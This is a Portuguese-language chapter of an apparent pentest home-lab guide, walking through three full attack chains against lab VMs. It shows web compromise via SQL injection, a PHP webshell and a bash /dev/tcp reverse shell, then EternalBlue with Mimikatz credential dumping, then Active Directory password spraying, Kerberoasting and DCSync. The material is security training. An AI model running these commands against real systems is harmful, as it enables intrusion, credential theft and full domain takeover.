# Parte 10 — Cenários de ataque detalhados

Teoria vira habilidade quando você encadeia as ferramentas num objetivo real. Estes três cenários são ataques completos, do reconhecimento ao comprometimento, usando exatamente as VMs do seu lab. Rode cada um do início ao fim — e, depois, volte a eles com o Wazuh ligado para ver o outro lado (isso é a [Parte 11](11-resposta-a-incidentes.md)).

## Cenário 1 — Comprometimento de servidor web

**Ambiente:** Kali host → VM DVWA (`192.168.200.30`) + Metasploitable3 Linux (`192.168.200.10`)

### Fase 1 — Reconhecimento
```bash
nmap -sS -sV -sC -p- 192.168.200.30 -oN web_scan.txt
# Resultado esperado: porta 80 Apache, 3306 MySQL, 22 SSH
```

### Fase 2 — Enumeração
```bash
nikto -h http://192.168.200.30
gobuster dir -u http://192.168.200.30 -w /usr/share/wordlists/dirb/big.txt -x php,html
```

### Fase 3 — Exploração SQLi
```bash
# Manual: ' OR '1'='1  no campo usuário
# Automatizado:
sqlmap -u 'http://192.168.200.30/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' \
  --cookie='security=low; PHPSESSID=X' -D dvwa -T users --dump

# Hashes extraídos → quebrar com a RTX 4060
hashcat -m 0 hashes_dvwa.txt /usr/share/wordlists/rockyou.txt
```

### Fase 4 — Webshell upload
```bash
# Crie shell.php:  <?php system($_GET['cmd']); ?>
# Faça upload em DVWA File Upload (nível Low)
# Acesse:  http://192.168.200.30/dvwa/hackable/uploads/shell.php?cmd=id

# Shell reverso:
#   cmd=bash+-c+'bash+-i+>&+/dev/tcp/192.168.100.100/4444+0>&1'
# Listener no Kali:
nc -lvnp 4444
```

## Cenário 2 — EternalBlue + Mimikatz (Metasploitable3 Windows)

**Ambiente:** Kali host → Metasploitable3 Windows (`192.168.200.20`)

```bash
# Confirmar MS17-010
nmap --script smb-vuln-ms17-010 -p 445 192.168.200.20
```

```
# Explorar
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.200.20
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run

# Pós-exploração
getuid && getsystem
load kiwi
creds_all                 # credenciais em memória
lsadump::sam              # hashes SAM
```

```bash
# Quebrar os hashes no Kali host com a RTX 4060
hashcat -m 1000 ntlm_hashes.txt rockyou.txt
```

## Cenário 3 — Active Directory: comprometimento total

**Ambiente:** Kali host → Windows Server AD (`192.168.200.40`) — domínio `corp.lab`

```bash
# Descoberta inicial
crackmapexec smb 192.168.200.0/24

# Password spray (cuidado com lockout!)
crackmapexec smb 192.168.200.40 -u users.txt -p 'Senha@123' --continue-on-success

# Com credencial obtida: Kerberoasting
python3 GetUserSPNs.py corp.lab/user:senha -dc-ip 192.168.200.40 -request
hashcat -m 13100 tgs.txt rockyou.txt   # RTX 4060 — muito rápido

# Mapear caminhos de ataque
bloodhound-python -u user -p senha -d corp.lab -ns 192.168.200.40 -c All

# DCSync como Domain Admin
python3 secretsdump.py corp.lab/admin:senha@192.168.200.40
```

---

⏮️ Anterior: **[Parte 9 — Criptografia](09-criptografia.md)** · ⏭️ Próximo: **[Parte 11 — Resposta a incidentes](11-resposta-a-incidentes.md)** · [↩︎ Índice](../README.md)
